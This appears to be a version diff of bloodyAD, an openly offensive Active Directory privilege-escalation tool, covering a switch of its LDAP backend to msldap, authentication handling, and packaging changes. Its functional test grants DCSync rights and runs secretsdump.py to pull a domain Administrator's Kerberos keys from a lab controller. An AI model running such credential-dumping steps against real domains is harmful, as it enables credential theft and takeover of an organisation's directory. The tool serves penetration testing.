+# [MS-ADTS] 6.1.6.7.12 trustDirection
+TRUST_DIRECTION = {"DISABLED": 0, "INBOUND": 1, "OUTBOUND": 2, "BIDIRECTIONAL": 3}
+
+# [MS-ADTS] 6.1.6.7.15 trustType
+TRUST_TYPE = {"LOCAL_WINDOWS": 1, "AD": 2, "NON_WINDOWS": 3, "AZURE": 5}
+
+# [MS-ADTS] 6.1.6.7.9 trustAttributes
+TRUST_ATTRIBUTES = {
+    "NON_TRANSITIVE": 0x1,
+    "UPLEVEL_ONLY": 0x2,
+    "QUARANTINED_DOMAIN": 0x4,
+    "FOREST_TRANSITIVE": 0x8,
+    "CROSS_ORGANIZATION": 0x10,
+    "WITHIN_FOREST": 0x20,
+    "TREAT_AS_EXTERNAL": 0x40,
+    "USES_RC4_ENCRYPTION": 0x80,
+    "CROSS_ORGANIZATION_NO_TGT_DELEGATION": 0x200,
+    "CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION": 0x800,
+    "PIM_TRUST": 0x400,
+}
```

### Comparing `bloodyad-1.1.1/bloodyAD/formatters/cryptography.py` & `bloodyad-2.0.3/bloodyAD/formatters/cryptography.py`

 * *Files identical despite different names*

### Comparing `bloodyad-1.1.1/bloodyAD/formatters/dns.py` & `bloodyad-2.0.3/bloodyAD/formatters/dns.py`

 * *Files identical despite different names*

### Comparing `bloodyad-1.1.1/bloodyAD/formatters/ldaptypes.py` & `bloodyad-2.0.3/bloodyAD/formatters/ldaptypes.py`

 * *Files identical despite different names*

### Comparing `bloodyad-1.1.1/bloodyAD/formatters/structure.py` & `bloodyad-2.0.3/bloodyAD/formatters/structure.py`

 * *Files identical despite different names*

### Comparing `bloodyad-1.1.1/bloodyAD/formatters/winerror.py` & `bloodyad-2.0.3/bloodyAD/formatters/winerror.py`

 * *Files identical despite different names*

### Comparing `bloodyad-1.1.1/bloodyAD/network/config.py` & `bloodyad-2.0.3/bloodyAD/network/config.py`

 * *Files 7% similar despite different names*

```diff
@@ -13,15 +13,15 @@
     password: str = ""
     lmhash: str = "aad3b435b51404eeaad3b435b51404ee"
     nthash: str = ""
     kerberos: bool = False
     certificate: str = ""
     crt: str = ""
     key: str = ""
-    url: str = ""
+    dcip: str = ""
 
     def __post_init__(self):
         # Handle case where password is hashes
         if self.password and ":" in self.password:
             lmhash_maybe, nthash_maybe = self.password.split(":")
             try:
                 int(nthash_maybe, 16)
@@ -38,44 +38,46 @@
                 else:
                     self.lmhash, self.nthash = None, None
 
         # Handle case where certificate is provided
         if self.certificate:
             self.key, self.crt = self.certificate.split(":")
 
-        # Build the url from parameters given
-        self.url = self.scheme + "://" + self.host
-
 
 class ConnectionHandler:
     _ldap = None
 
     def __init__(self, args=None, config=None):
         if args:
-            scheme = "ldaps" if args.secure else "ldap"
+            scheme = "ldap"
+            if args.gc:
+                scheme = "gc"
+            elif args.secure:
+                scheme = "ldaps"
             cnf = Config(
                 domain=args.domain,
                 username=args.username,
                 password=args.password,
                 scheme=scheme,
                 host=args.host,
                 kerberos=args.kerberos,
                 certificate=args.certificate,
+                dcip=args.dc_ip,
             )
         else:
             cnf = config
         self.conf = cnf
 
     @property
     def ldap(self):
         if not self._ldap:
             self._ldap = Ldap(self.conf)
         return self._ldap
 
     def rebind(self):
-        self._ldap.unbind()
+        self._ldap.close()
         self._ldap = Ldap(self.conf)
 
     def switchUser(self, username, password):
         self.conf.username = username
         self.conf.password = password
         self.rebind()
```

### Comparing `bloodyad-1.1.1/bloodyAD/network/ldap.py` & `bloodyad-2.0.3/bloodyAD/network/ldap.py`

 * *Files 27% similar despite different names*

```diff
@@ -1,238 +1,316 @@
-from bloodyAD.patch import ldap3_patch
-from bloodyAD.formatters import formatters, accesscontrol, helpers
-from bloodyAD.formatters.formatters import (
-    formatFunctionalLevel,
-    formatGMSApass,
-    formatSD,
-    formatSchemaVersion,
-    formatAccountControl,
-    formatDnsRecord,
-    formatKeyCredentialLink,
-    formatWellKnownObjects,
-)
-from bloodyAD.exceptions import NoResultError, TooManyResultsError, BloodyError
-import re, ssl
+from bloodyAD.formatters import accesscontrol
+from bloodyAD.exceptions import NoResultError, TooManyResultsError
+import re, socket, os, enum, asyncio, threading
 from functools import cached_property, lru_cache
-import ldap3
-from ldap3.protocol.formatters.formatters import format_sid, format_uuid_le
+from msldap.client import MSLDAPClient
+from msldap.commons.factory import LDAPConnectionFactory
+from msldap.wintypes.asn1.sdflagsrequest import SDFlagsRequestValue
 
 
-class Ldap(ldap3.Connection):
+class Scope(enum.Enum):
+    BASE = 0
+    LEVEL = 1
+    SUBTREE = 2
+
+
+class Change(enum.Enum):
+    ADD = "add"
+    DELETE = "delete"
+    REPLACE = "replace"
+    INCREMENT = "increment"
+
+
+class Ldap(MSLDAPClient):
     conf = None
     domainNC = None
     configNC = None
 
     def __init__(self, cnf):
         self.conf = cnf
-        ldap_server_kwargs = {
-            "host": cnf.url,
-            "get_info": ldap3.ALL,
-            "formatter": {
-                "nTSecurityDescriptor": formatSD,
-                "msDS-AllowedToActOnBehalfOfOtherIdentity": formatSD,
-                "msDS-Behavior-Version": formatFunctionalLevel,
-                "objectVersion": formatSchemaVersion,
-                "userAccountControl": formatAccountControl,
-                "msDS-User-Account-Control-Computed": formatAccountControl,
-                "msDS-ManagedPassword": formatGMSApass,
-                "msDS-GroupMSAMembership": formatSD,
-                "dnsRecord": formatDnsRecord,
-                "msDS-KeyCredentialLink": formatKeyCredentialLink,
-                "tokenGroups": format_sid,
-                "tokenGroupsNoGCAcceptable": format_sid,
-                "wellKnownObjects": formatWellKnownObjects,
-                "schemaIDGUID": format_uuid_le,
-                "attributeSecurityGUID": format_uuid_le,
-            },
-        }
-        ldap_connection_kwargs = {"raise_exceptions": True, "auto_range": True}
+        auth = ""
+        creds = ""
+        params = ""
+        username = ""
+        key = ""
 
         if cnf.crt:
-            key = cnf.key if cnf.key else None
-            tls = ldap3.Tls(
-                local_private_key_file=key,
-                local_certificate_file=cnf.crt,
-                validate=ssl.CERT_NONE,
-            )
-            ldap_server_kwargs["tls"] = tls
-            if cnf.scheme != "ldaps":
-                ldap_connection_kwargs.update({
-                    "authentication": ldap3.SASL,
-                    "sasl_mechanism": ldap3.EXTERNAL,
-                    "auto_bind": ldap3.AUTO_BIND_TLS_BEFORE_BIND,
-                })
+            auth = "ssl"
+            crt = "sslcert=" + cnf.crt
+            sslparams = f"{crt}&sslpassword={cnf.key}" if cnf.key else crt
+            params = params + "&" + sslparams if params else sslparams
+
         elif cnf.kerberos:
-            ldap_connection_kwargs.update({
-                "authentication": ldap3.SASL,
-                "sasl_mechanism": ldap3.KERBEROS,
-            })
-            if cnf.scheme != "ldaps":
-                ldap_connection_kwargs.update({"session_security": "ENCRYPT"})
+            username = "%s\\%s" % (cnf.domain, cnf.username)
+            if cnf.dcip:
+                dcip = cnf.dcip
+            else:
+                dcip = socket.gethostbyname(cnf.host)
+            if dcip == cnf.host:
+                raise TypeError(
+                    "You can provide the IP in --dc-ip but you need to provide the"
+                    " hostname in --host in order for kerberos to work"
+                )
+            dcip_param = "dc=" + dcip
+            params = params + "&" + dcip_param if params else dcip_param
+            if cnf.password:
+                auth = "kerberos-password"
+                key = cnf.password
+            else:
+                auth = "kerberos-ccache"
+                key = os.getenv("KRB5CCNAME")
+                if not key:
+                    if os.name == "nt":
+                        auth = "sspi-kerberos"
+                    else:
+                        raise TypeError(
+                            "You should provide a -p 'password' or a kerberos ticket"
+                            " via environment variable KRB5CCNAME=./myticket "
+                        )
 
         else:
-            ldap_connection_kwargs.update({
-                "user": "%s\\%s" % (cnf.domain, cnf.username),
-                "password": cnf.password,
-                "authentication": ldap3.NTLM,
-            })
-            if cnf.scheme != "ldaps":
-                ldap_connection_kwargs.update({"session_security": "ENCRYPT"})
-
-        s = ldap3.Server(**ldap_server_kwargs)
-        super().__init__(s, **ldap_connection_kwargs)
-        if cnf.crt and cnf.scheme == "ldaps":
-            self.open()
-        else:
-            self.bind()
-
-        helpers.ldap_conn = self
+            username = "%s\\%s" % (cnf.domain, cnf.username)
+            if cnf.nthash:
+                auth = "ntlm-nt"
+                key = cnf.nthash
+            else:
+                auth = "ntlm-password"
+                key = cnf.password
+                if not key:
+                    if os.name == "nt":
+                        auth = "sspi-ntlm"
+                    else:
+                        raise TypeError("You should provide a -p 'password'")
+
+        auth = "+" + auth if auth else ""
+        creds = username if username else ""
+        creds = creds + ":" + key if key else creds
+        creds = creds + "@" if creds else ""
+        params = "/?" + params if params else ""
+        ldap_factory = LDAPConnectionFactory.from_url(
+            f"{cnf.scheme}{auth}://{creds}{cnf.host}{params}"
+        )
+        super().__init__(ldap_factory.target, ldap_factory.credential, keepalive=True)
 
-        self.domainNC = self.server.info.other["defaultNamingContext"][0]
-        self.configNC = self.server.info.other["configurationNamingContext"][0]
-        self.schemaNC = self.server.info.other["schemaNamingContext"][0]
-        self.appNCs = []
-        for nc in self.server.info.naming_contexts:
-            if nc == self.domainNC or nc == self.configNC or nc == self.schemaNC:
-                continue
-            self.appNCs.append(nc)
+        # Connect function runs indefinitely waiting for I/O events so using asyncio.run will not allow us to reuse the connection
+        # To avoid it, we launch it in another thread and we control it using a defined event_loop
+        self.loop = asyncio.new_event_loop()
+        connect_task = self.loop.create_task(self.connect())
+        self.thread = threading.Thread(target=self.loop.run_forever)
+        self.thread.start()
+
+        # Using an async function to await connect_task because connect_task.result doesn't work
+        async def getServerInfo(task):
+            return await task
+
+        try:
+            _, err = asyncio.run_coroutine_threadsafe(
+                getServerInfo(connect_task), self.loop
+            ).result()
+            if err:
+                raise err
+
+            self.domainNC = self._serverinfo["defaultNamingContext"]
+            self.configNC = self._serverinfo["configurationNamingContext"]
+            self.schemaNC = self._serverinfo["schemaNamingContext"]
+            self.appNCs = []
+            for nc in self._serverinfo["namingContexts"]:
+                if nc == self.domainNC or nc == self.configNC or nc == self.schemaNC:
+                    continue
+                self.appNCs.append(nc)
+        except Exception as e:
+            self.closeThread()
+            raise e
 
     def bloodyadd(self, target, **kwargs):
-        self.add(self.dnResolver(target), **kwargs)
-        if self.result["description"] != "success":
-            raise BloodyError(self.result["description"])
+        _, err = asyncio.run_coroutine_threadsafe(
+            self.add(self.dnResolver(target), **kwargs), self.loop
+        ).result()
+        if err:
+            raise err
+
+    def closeThread(self):
+        for task in asyncio.all_tasks(self.loop):
+            task.cancel()
+        self.loop.call_soon_threadsafe(self.loop.stop)
+        self.thread.join(0)
+
+    def close(self):
+        asyncio.run_coroutine_threadsafe(self.disconnect(), self.loop).result()
+        self.closeThread()
 
     def bloodydelete(self, target, *args):
-        self.delete(self.dnResolver(target), *args)
+        _, err = asyncio.run_coroutine_threadsafe(
+            self.delete(self.dnResolver(target), *args), self.loop
+        ).result()
+        if err:
+            raise err
 
     @lru_cache
     def dnResolver(self, identity, objtype=None):
         """
         Return the DN for the object based on the parameters identity
         Args:
             identity: sAMAccountName, DN, GUID or SID of the user
             objtype: None is default or GPO
         """
-        if "dc=" in identity.lower():
-            # identity is a DN, return as is
-            # We do not try to validate it because it could be from another trusted domain
-            return identity
-
-        if "s-1-" in identity.lower():
-            # We assume identity is an SID
-            ldap_filter = f"(objectSid={identity})"
-        elif "{" in identity:
-            if objtype == "GPO":
-                ldap_filter = f"(&(objectClass=groupPolicyContainer)(name={identity}))"
+
+        async def asyncDnResolver(identity, objtype=None):
+            if "dc=" in identity.lower():
+                # identity is a DN, return as is
+                # We do not try to validate it because it could be from another trusted domain
+                return identity
+
+            if "s-1-" in identity.lower():
+                # We assume identity is an SID
+                ldap_filter = f"(objectSid={identity})"
+            elif "{" in identity:
+                if objtype == "GPO":
+                    ldap_filter = (
+                        f"(&(objectClass=groupPolicyContainer)(name={identity}))"
+                    )
+                else:
+                    # We assume identity is a GUID
+                    ldap_filter = f"(objectGUID={identity})"
             else:
-                # We assume identity is a GUID
-                ldap_filter = f"(objectGUID={identity})"
-        else:
-            # By default, we assume identity is a sam account name
-            ldap_filter = f"(sAMAccountName={identity})"
+                # By default, we assume identity is a sam account name
+                ldap_filter = f"(sAMAccountName={identity})"
+
+            dn = ""
+            entries = self.pagedsearch(
+                ldap_filter, ["distinguishedName"], tree=self.domainNC
+            )
+            async for entry, err in entries:
+                if err:
+                    raise err
+                if dn:
+                    raise TooManyResultsError(self.domainNC, ldap_filter, entries)
+                dn = entry["attributes"]["distinguishedName"]
+
+            if not dn:
+                raise NoResultError(self.domainNC, ldap_filter)
+
+            return dn
+
+        return asyncio.run_coroutine_threadsafe(
+            asyncDnResolver(identity, objtype), self.loop
+        ).result()
+
+    def bloodymodify(self, target, changes, controls=None, encode=True):
+        if controls is not None:
+            t = []
+            for control in controls:
+                t.append({
+                    "controlType": control[0].encode(),
+                    "criticality": control[1],
+                    "controlValue": control[2],
+                })
+            controls = t
 
-        super().search(self.domainNC, ldap_filter)
-        dn = ""
-        for entry in self.entries:
-            if dn:
-                raise TooManyResultsError(self.domainNC, ldap_filter, self.entries)
-            dn = entry.entry_dn
-
-        if not dn:
-            raise NoResultError(self.domainNC, ldap_filter)
-
-        return dn
-
-    def bloodymodify(self, target, *args):
-        self.modify(self.dnResolver(target), *args)
-        if self.result["description"] != "success":
-            raise BloodyError(self.result["description"])
+        _, err = asyncio.run_coroutine_threadsafe(
+            self.modify(self.dnResolver(target), changes, controls, encode=encode),
+            self.loop,
+        ).result()
+        if err:
+            raise err
 
     @cached_property
     def policy(self):
         """
         [MS-ADTS] - 3.1.1.3.4.6 LDAP Policies
         """
-        dict_policy = {"MaxPageSize": 1000}
 
-        nTDSDSA_dn = self.server.info.other["dsServiceName"][0]
-        site_match = re.search("[^,]+,CN=Sites.+", nTDSDSA_dn)
-        nTDSSiteSettings_filter = ""
-        if site_match:
-            nTDSSiteSettings_dn = "CN=NTDS Site Settings," + site_match.group()
-            nTDSSiteSettings_filter = f"(distinguishedName={nTDSSiteSettings_dn})"
-        default_policy_dn = (
-            "CN=Default Query Policy,CN=Query-Policies,CN=Directory Service,CN=Windows"
-            " NT,CN=Services,"
-            + self.configNC
-        )
+        async def asyncPolicy():
+            dict_policy = {"MaxPageSize": 1000}
 
-        ldap_filter = f"(|(distinguishedName={nTDSDSA_dn}){nTDSSiteSettings_filter}(distinguishedName={default_policy_dn}))"
-        raw_policy = ""
-        super().search(self.configNC, ldap_filter, attributes=["lDAPAdminLimits"])
-        for entry in self.entries:
-            if "lDAPAdminLimits" not in entry:
-                continue
+            nTDSDSA_dn = self._serverinfo["dsServiceName"]
+            site_match = re.search("[^,]+,CN=Sites.+", nTDSDSA_dn)
+            nTDSSiteSettings_filter = ""
+            if site_match:
+                nTDSSiteSettings_dn = "CN=NTDS Site Settings," + site_match.group()
+                nTDSSiteSettings_filter = f"(distinguishedName={nTDSSiteSettings_dn})"
+            default_policy_dn = (
+                "CN=Default Query Policy,CN=Query-Policies,CN=Directory"
+                " Service,CN=Windows NT,CN=Services,"
+                + self.configNC
+            )
+            ldap_filter = f"(|(distinguishedName={nTDSDSA_dn}){nTDSSiteSettings_filter}(distinguishedName={default_policy_dn}))"
+            raw_policy = ""
 
-            if entry.entry_dn == nTDSDSA_dn:
-                raw_policy = entry["lDAPAdminLimits"]
-                break
-            elif entry.entry_dn == nTDSSiteSettings_dn:
-                raw_policy = entry["lDAPAdminLimits"]
-            elif not raw_policy and entry.entry_dn == default_policy_dn:
-                raw_policy = entry["lDAPAdminLimits"]
-
-        for raw_param in raw_policy:
-            param_name, _, param_val = raw_param.partition("=")
-            dict_policy[param_name] = int(param_val)
+            async for entry, err in self.pagedsearch(
+                ldap_filter, ["lDAPAdminLimits"], tree=self.configNC
+            ):
+                if err:
+                    raise err
+
+                if "lDAPAdminLimits" not in entry:
+                    continue
+                if entry["objectName"] == nTDSDSA_dn:
+                    raw_policy = entry["attributes"]["lDAPAdminLimits"]
+                    break
+                elif entry["objectName"] == nTDSSiteSettings_dn:
+                    raw_policy = entry["attributes"]["lDAPAdminLimits"]
+                elif not raw_policy and entry["objectName"] == default_policy_dn:
+                    raw_policy = entry["attributes"]["lDAPAdminLimits"]
+
+            for raw_param in raw_policy:
+                param_name, _, param_val = raw_param.partition("=")
+                dict_policy[param_name] = int(param_val)
+
+            return dict_policy
 
-        return dict_policy
+        return asyncio.run_coroutine_threadsafe(asyncPolicy(), self.loop).result()
 
     def bloodysearch(
         self,
         base,
         ldap_filter="(objectClass=*)",
-        search_scope=ldap3.BASE,
+        search_scope=Scope.BASE,
         attr=["*"],
         control_flag=(
             accesscontrol.OWNER_SECURITY_INFORMATION
             + accesscontrol.GROUP_SECURITY_INFORMATION
             + accesscontrol.DACL_SECURITY_INFORMATION
         ),
         controls=None,
         op_attr=False,
-        generator=False,
         raw=False,
     ):
         # Handles corner case where querying default partitions (no dn provided for that)
         if base:
             base_dn = self.dnResolver(base)
         else:
             base_dn = base
 
         if not controls:
-            controls = ldap3.protocol.microsoft.security_descriptor_control(
-                sdflags=control_flag
-            )
+            # Search control to request security descriptor parts
+            req_flags = SDFlagsRequestValue({"Flags": control_flag})
+            controls = [("1.2.840.113556.1.4.801", True, req_flags.dump())]
+
+        self.ldap_query_page_size = self.policy["MaxPageSize"]
 
-        entries = self.extend.standard.paged_search(
-            base_dn,
+        search_generator = self.pagedsearch(
             ldap_filter,
-            search_scope=search_scope,
-            attributes=attr,
-            dereference_aliases=ldap3.DEREF_NEVER,
-            get_operational_attributes=op_attr,
-            paged_size=self.policy["MaxPageSize"],
+            attr,
+            tree=base_dn,
+            search_scope=search_scope.value,
             controls=controls,
-            generator=generator,
+            raw=raw,
         )
 
-        attrtype = "raw_attributes" if raw else "attributes"
-        dntype = "raw_dn" if raw else "dn"
         isNul = True
-        for entry in entries:
-            if attrtype not in entry:
-                continue
-            isNul = False
-            yield {**{"distinguishedName": entry[dntype]}, **entry[attrtype]}
+        while True:
+            try:
+                entry, err = asyncio.run_coroutine_threadsafe(
+                    search_generator.__anext__(), self.loop
+                ).result()
+                if err:
+                    raise err
+                isNul = False
+                yield {
+                    **{"distinguishedName": entry["objectName"]},
+                    **entry["attributes"],
+                }
+            except StopAsyncIteration:
+                break
         if isNul:
             raise NoResultError(base_dn, ldap_filter)
```

### Comparing `bloodyad-1.1.1/tests/test_functional.py` & `bloodyad-2.0.3/tests/test_functional.py`

 * *Files 0% similar despite different names*

```diff
@@ -7,26 +7,27 @@
     def setUpClass(cls):
         conf = json.loads((pathlib.Path(__file__).parent / "secrets.json").read_text())
         cls.domain = conf["domain"]
         cls.rootDomainNamingContext = ",".join([
             "DC=" + subdomain for subdomain in cls.domain.split(".")
         ])
         cls.host = conf["pdc"]["ip"]
+        cls.hostname = conf["pdc"]["hostname"]
         cls.admin = {
             "username": conf["admin_user"]["username"],
             "password": conf["admin_user"]["password"],
         }
         cls.pkinit_path = conf["pkinit_path"]
         cls.toTear = []
         cls.env = os.environ.copy()
         cls.bloody_prefix = [
             "python3",
             "bloodyAD.py",
             "--host",
-            cls.host,
+            cls.hostname,
             "-d",
             cls.domain,
         ]
         cls.user = {"username": "stan.dard", "password": "Password1123!"}
 
     def test_01AuthCreateUser(self):
         # Add User
@@ -91,15 +92,15 @@
                         sec_state + "get object Administrator --attr sAMAccountName"
                     ).split(" ")
                 )
 
     def test_02SearchAndGetChildAndGetWritable(self):
         self.launchBloody(
             self.user,
-            ["get", "children", "--target", "OU=Domain Controllers,DC=bloody,DC=local"],
+            ["get", "children", "--target", "OU=Domain Controllers,DC=bloody,DC=lab"],
         )
 
         self.launchBloody(
             self.user,
             [
                 "get",
                 "search",
@@ -256,25 +257,25 @@
             ["add", "genericAll", self.rootDomainNamingContext, self.user["username"]],
         )
         self.launchBloody(self.user, ["add", "dcsync", slave["username"]])
         self.assertRegex(
             self.launchProcess([
                 "secretsdump.py",
                 "-just-dc-user",
-                "Administrator",
+                "BLOODY/Administrator",
                 f"{self.domain}/{slave['username']}:{slave['password']}@{self.host}",
             ]),
             "Kerberos keys grabbed",
         )
         self.launchBloody(self.user, ["remove", "dcsync", slave["username"]])
         self.assertNotRegex(
             self.launchProcess([
                 "secretsdump.py",
                 "-just-dc-user",
-                "Administrator",
+                "BLOODY/Administrator",
                 f"{self.domain}/{slave['username']}:{slave['password']}@{self.host}",
             ]),
             "Kerberos keys grabbed",
         )
         self.launchBloody(
             self.admin,
             [
```

### Comparing `bloodyad-1.1.1/LICENSE` & `bloodyad-2.0.3/LICENSE`

 * *Files identical despite different names*

### Comparing `bloodyad-1.1.1/README.md` & `bloodyad-2.0.3/README.md`

 * *Files 9% similar despite different names*

```diff
@@ -25,11 +25,12 @@
 
 ## Support
 Like this project? Donations are greatly appreciated :relaxed: [![](https://img.shields.io/static/v1?label=Sponsor&message=%E2%9D%A4&logo=GitHub&color=%23fe8e86)](https://github.com/sponsors/CravateRouge)
 
 Need personalized support? send me an [email](mailto:baptiste.crepin@ntymail.com) for trainings or custom features.
 
 ## Acknowledgements
+- Thanks to [@skelsec](https://github.com/skelsec) for his amazing libraries especially [MSLDAP](https://github.com/skelsec/msldap) which is now the engine on which bloodyAD is running.
 - Thanks to [impacket](https://github.com/fortra/impacket) contributors. [Structures](https://github.com/fortra/impacket/blob/master/impacket/structure.py) and several [LDAP attacks](https://github.com/fortra/impacket/blob/master/impacket/examples/ntlmrelayx/attacks/ldapattack.py) are based on their work.
 - Thanks to [@PowerShellMafia](https://github.com/PowerShellMafia) team ([PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)) and their work on AD which inspired this tool.
 - Thanks to [@dirkjanm](https://github.com/dirkjanm) ([adidnsdump.py](https://github.com/dirkjanm/adidnsdump)) and ([@Kevin-Robertson](https://github.com/Kevin-Robertson))([Invoke-DNSUpdate.ps1](https://github.com/Kevin-Robertson/Powermad/blob/master/Invoke-DNSUpdate.ps1)) for their work on AD DNS which inspired DNS functionnalities.
 - Thanks to [@p0dalirius](https://github.com/p0dalirius/) and his [pydsinternals](https://github.com/p0dalirius/pydsinternals) module which helped to build the shadow credential attack
```

### Comparing `bloodyad-1.1.1/pyproject.toml` & `bloodyad-2.0.3/pyproject.toml`

 * *Files 17% similar despite different names*

```diff
@@ -3,30 +3,29 @@
 build-backend = "hatchling.build"
 
 [project]
 name = "bloodyAD"
 authors = [
     { name="CravateRouge", email="baptiste.crepin@ntymail.com" },
 ]
-version = "1.1.1"
+version = "2.0.3"
 description = "AD Privesc Swiss Army Knife"
 readme = "README.md"
 requires-python = ">=3.8"
 classifiers = [
         "Programming Language :: Python :: 3",
         "License :: OSI Approved :: MIT License",
         "Operating System :: OS Independent",
 ]
 dependencies = [
         "cryptography>=37.0.2",
-        "ldap3>=2.9.1",
+        "msldap>=0.5.9",
         "winacl>=0.1.7",
-        "gssapi>=1.8.1 ; os_name != 'nt'",
-        "winkerberos>=0.9.0; os_name == 'nt'",
-        "pyasn1>=0.4.8",
+        "asn1crypto>=1.3.0",
+        "dnspython>=2.3.0"
 ]
 
 [project.urls]
 "Homepage" = "https://github.com/CravateRouge/bloodyAD"
 "Bug Tracker" = "https://github.com/CravateRouge/bloodyAD/issues"
 
 [project.scripts]
```

### Comparing `bloodyad-1.1.1/PKG-INFO` & `bloodyad-2.0.3/PKG-INFO`

 * *Files 6% similar despite different names*

```diff
@@ -1,25 +1,24 @@
-Metadata-Version: 2.1
+Metadata-Version: 2.3
 Name: bloodyAD
-Version: 1.1.1
+Version: 2.0.3
 Summary: AD Privesc Swiss Army Knife
 Project-URL: Homepage, https://github.com/CravateRouge/bloodyAD
 Project-URL: Bug Tracker, https://github.com/CravateRouge/bloodyAD/issues
 Author-email: CravateRouge <baptiste.crepin@ntymail.com>
 License-File: LICENSE
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Operating System :: OS Independent
 Classifier: Programming Language :: Python :: 3
 Requires-Python: >=3.8
+Requires-Dist: asn1crypto>=1.3.0
 Requires-Dist: cryptography>=37.0.2
-Requires-Dist: gssapi>=1.8.1; os_name != 'nt'
-Requires-Dist: ldap3>=2.9.1
-Requires-Dist: pyasn1>=0.4.8
+Requires-Dist: dnspython>=2.3.0
+Requires-Dist: msldap>=0.5.9
 Requires-Dist: winacl>=0.1.7
-Requires-Dist: winkerberos>=0.9.0; os_name == 'nt'
 Description-Content-Type: text/markdown
 
 > :warning: autobloody has been moved to its own [repo](https://github.com/CravateRouge/autobloody)  
 
 # ![bloodyAD logo](https://repository-images.githubusercontent.com/415977068/9b2fed72-35fb-4faa-a8d3-b120cd3c396f) bloodyAD
 
 `bloodyAD` is an Active Directory privilege escalation swiss army knife
@@ -45,11 +44,12 @@
 
 ## Support
 Like this project? Donations are greatly appreciated :relaxed: [![](https://img.shields.io/static/v1?label=Sponsor&message=%E2%9D%A4&logo=GitHub&color=%23fe8e86)](https://github.com/sponsors/CravateRouge)
 
 Need personalized support? send me an [email](mailto:baptiste.crepin@ntymail.com) for trainings or custom features.
 
 ## Acknowledgements
+- Thanks to [@skelsec](https://github.com/skelsec) for his amazing libraries especially [MSLDAP](https://github.com/skelsec/msldap) which is now the engine on which bloodyAD is running.
 - Thanks to [impacket](https://github.com/fortra/impacket) contributors. [Structures](https://github.com/fortra/impacket/blob/master/impacket/structure.py) and several [LDAP attacks](https://github.com/fortra/impacket/blob/master/impacket/examples/ntlmrelayx/attacks/ldapattack.py) are based on their work.
 - Thanks to [@PowerShellMafia](https://github.com/PowerShellMafia) team ([PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)) and their work on AD which inspired this tool.
 - Thanks to [@dirkjanm](https://github.com/dirkjanm) ([adidnsdump.py](https://github.com/dirkjanm/adidnsdump)) and ([@Kevin-Robertson](https://github.com/Kevin-Robertson))([Invoke-DNSUpdate.ps1](https://github.com/Kevin-Robertson/Powermad/blob/master/Invoke-DNSUpdate.ps1)) for their work on AD DNS which inspired DNS functionnalities.
 - Thanks to [@p0dalirius](https://github.com/p0dalirius/) and his [pydsinternals](https://github.com/p0dalirius/pydsinternals) module which helped to build the shadow credential attack
```

